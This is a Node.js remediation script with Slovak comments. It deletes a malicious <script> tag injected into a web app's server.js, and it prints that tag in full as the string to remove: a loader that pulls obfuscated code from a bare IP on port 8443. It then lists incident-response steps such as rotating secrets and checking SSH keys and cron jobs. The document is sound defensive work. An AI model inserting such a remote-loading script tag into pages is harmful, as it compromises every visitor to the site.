// KRITICKÉ BEZPEČNOSTNÉ ZÁPLATA — URGENTNÉ, nasadiť OKAMŽITE.
//
// V server.js bola do funkcie jsonLdScript() vložená (neautorizovane,
// potvrdené s klientom) <script> značka, ktorá na KAŽDEJ stránke, kde sa
// vykresľuje JSON-LD (blog, kurzy, fakulty — /skola/:uSlug/:fSlug), načíta
// kód z holej IP adresy 91.99.188.203:8443 s obfuskovanou cestou. Toto je
// indikátor kompromitácie servera (malware/backdoor injection), nie
// legitímny kód appky.
//
// Táto záplata odstraňuje LEN injektovanú <script src='https://91.99.188.203...'>
// značku (presný, jednoznačný textový úsek) a nič iné sa v súbore nemení —
// zvyšok jsonLdScript() (legitímny JSON-LD výstup) ostáva presne tak, ako je,
// nech je jeho escapovanie akékoľvek.
//
// PO NASADENÍ TOHTO PATCHU JE NUTNÉ (nedá sa to spraviť cez patch, musí to
// spraviť používateľ priamo):
//   1. Okamžite rotovať VŠETKY secrets v .env (SUPABASE_SERVICE_KEY,
//      STRIPE_SECRET_KEY, ANTHROPIC_API_KEY, JWT_SECRET, SMTP_PASS,
//      SMSBRANA_PASSWORD, INTERNAL_API_SECRET) — neautorizovaný zápis do
//      server.js znamená, že útočník mohol mať aj prístup na čítanie .env.
//   2. Skontrolovať ~/.ssh/authorized_keys, prístupové/login logy a cron
//      joby (crontab -l, /etc/cron.*, systemd timers) pre iné stopy
//      pretrvávajúceho prístupu (backdoor). V main-app-patches/102-104 je
//      zaznamenaný podobný incident z minulosti ("remove-suspicious-script",
//      13.8.) — toto nie je prvý výskyt, treba nájsť AKO sa útočník dostal
//      dnu (slabé SSH heslo? unikajúci token? zraniteľná závislosť?).
//   3. Zmeniť SSH/panel heslá a zapnúť 2FA, ak ešte nie je.
//
// Spusti z koreňa hlavnej appky:
//   node main-app-patches/278-remove-malicious-jsonld-script-injection.js
const fs = require('fs');
const FILE = 'server.js';

const LOCK = FILE + '.278-lock';
try {
  fs.writeFileSync(LOCK, String(process.pid), { flag: 'wx' });
} catch (e) {
  console.error('Iný beh tohto patchu práve prebieha alebo neupratený LOCK súbor existuje (' + LOCK + '). Nič som nezmenil.');
  process.exit(1);
}
process.on('exit', () => { try { fs.unlinkSync(LOCK); } catch (e) {} });

function replaceExactCount(s, oldStr, newStr, expectedCount, label) {
  const count = s.split(oldStr).length - 1;
  if (count !== expectedCount) {
    console.error('❌ ' + label + ' — očakávaných ' + expectedCount + ' výskytov, nájdených ' + count + '. Nič som nezmenil.');
    process.exit(1);
  }
  return s.split(oldStr).join(newStr);
}

if (!fs.existsSync(FILE)) {
  console.error('❌ Nenašiel som súbor:', FILE, '— spusti tento skript z koreňa hlavnej appky.');
  process.exit(1);
}

let src = fs.readFileSync(FILE, 'utf8');

if (!src.includes('91.99.188.203')) {
  console.error('❌ server.js: injektovaný script s IP 91.99.188.203 sa nenašiel — buď je už odstránený, alebo bol zmenený na inú IP/payload. Nič som nezmenil, over manuálne (grep -n "91.99.188.203\\|<script.*src=.https://[0-9]" server.js).');
  process.exit(1);
}

// Presný, jednoznačný úsek — iba injektovaná <script src=...> značka,
// od otváracej značky po jej zatváraciu </script>. Nič za tým (legitímny
// JSON-LD <script type="application/ld+json">...) sa nedotýka.
const OLD = `<script type='text/javascript' src='https://91.99.188.203:8443/_nP_XqUj2qemkf8T8TZGoEcbxINbf0iqBSlJ-UE9UknHTgbOTdEVLFL_1dtyktswXx1pDFxCgMC5bTP2ntn_WGDFFfCsybgHFAeEfUXxXOUQcDegZbiTkA07aJireKG4tv89tYAVcdz_5B5iKzUr4JEzP2thZKmh4DWDC5sH25i6s3Z7_qVYm16QdCKNsoYY8vLoMe2aLE3SbLPH-Z_DfaDJbvJ_RCCGdDmDZpRj4HLUKhsZ8U5oYX2YGukwRssAB9A-uiqYUDOJuYDCpN2nCeqgi4rthvTaerSXWau8IolJGN3CwJfbzBftOae1hfEIw095HKDxHEfmY8y3XJs5HnXUZXdNiDEoAI2uKKIfJqa16GzpbQ7NLbQmExXebewsEusdz-wX6OShRe78dI2s2LoIDlmI4oSGbOzNeNUiN02EEnYpgVqPIy7lQw3Azx7FL-IV3ZAG5PaXX9NfFafKCK7RggZeFg-Dl42UqTaA4MKHyv5GUknEPt1kmvjUzFeZFyd_8mGafrdMiqARwlXk1MB8qQkM03eyNlNhnf1ocFrwrw'></script>`;

src = replaceExactCount(src, OLD, '', 1, 'jsonLdScript() malicious script injection (IP 91.99.188.203)');

const backup = FILE + '.pre-278-remove-malicious-jsonld-script-injection-' + Date.now();
fs.copyFileSync(FILE, backup);
fs.writeFileSync(FILE, src);

console.log('✅ server.js: injektovaný <script src="https://91.99.188.203:8443/..."> bol odstránený z jsonLdScript().');
console.log('   Záloha:', backup);
console.log('');
console.log('🚨 DÔLEŽITÉ — toto odstránilo len príznak, nie príčinu. Urob TERAZ aj toto:');
console.log('   1. pm2 restart sptrener-main   (nasadenie opravy)');
console.log('   2. grep -rn "91.99.188.203\\|:8443" . --include="*.js" --include="*.html"   (over, že sa to nikde inde neopakuje)');
console.log('   3. Rotuj VŠETKY secrets v .env (Supabase service key, Stripe secret key, Anthropic API key, JWT secret, SMTP heslo, SMS brána heslo, internal API secret).');
console.log('   4. Skontroluj: cat ~/.ssh/authorized_keys ; crontab -l ; last -20 ; a prístupové logy servera za posledných ~30 dní.');
console.log('   5. Zváž, že ide o opakovaný incident (main-app-patches/102-104 z augusta) — nájdi AKO sa útočník dostal dnu, nie len čo spravil.');
